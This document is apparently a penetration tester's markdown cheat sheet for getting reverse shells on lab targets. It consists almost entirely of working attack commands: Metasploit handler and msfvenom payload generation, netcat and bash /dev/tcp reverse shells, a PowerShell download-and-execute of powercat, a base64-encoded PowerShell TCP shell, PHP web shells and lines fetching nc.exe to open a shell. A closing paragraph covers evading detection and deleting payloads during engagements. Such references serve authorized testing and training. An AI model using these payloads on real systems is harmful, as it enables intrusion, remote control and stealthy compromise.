[Revshells](https://www.revshells.com)
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[ASPX Reverse Shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
[PHP Reverse Shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php)
```bash
msfconsole -q -x 'use exploit/multi/handler;set LHOST tun0; set LPORT 443; run'

msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 8443; run'

msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 8443; run'
```

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4443 -f elf > shell.elf

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $ip 443 >/tmp/f
bash -c 'bash -i >& /dev/tcp/$ip/443 0>&1'

python3 -c 'import pty; pty.spawn("/bin/bash")' 
stty raw -echo && fg
```


```bash
msfconsole -q -x 'exploit/windows/smb/smb_delivery; set LHOST 10.10.15.155; set LPORT 8443; run'
use exploit/windows/smb/smb_delivery

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=443 -f exe > shell.exe
```
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:80/powercat.ps1');powercat -c 10.10.14.3 -p 443 -e powershell"

```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.237",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
powershell -e <payload>
```

```php
<?php system($_GET['cmd']) ?> 
<?php system($_REQUEST['cmd']) ?> 
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
system("powershell -c curl http://10.10.14.6/nc.exe -o C:\\programdata\\nc.exe");
system("C:\\programdata\\nc.exe 10.10.14.6 1337 -e powershell.exe");
```


Depending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and `cover our tracks`. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. In most cases, when attempting to gain a shell session with a target, it would be wise to establish a reverse shell and then delete the executed payload. Also, we must document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use. We could include a sha1sum or MD5 hash of the file name, upload locations in our reports as proof, and provide attribution.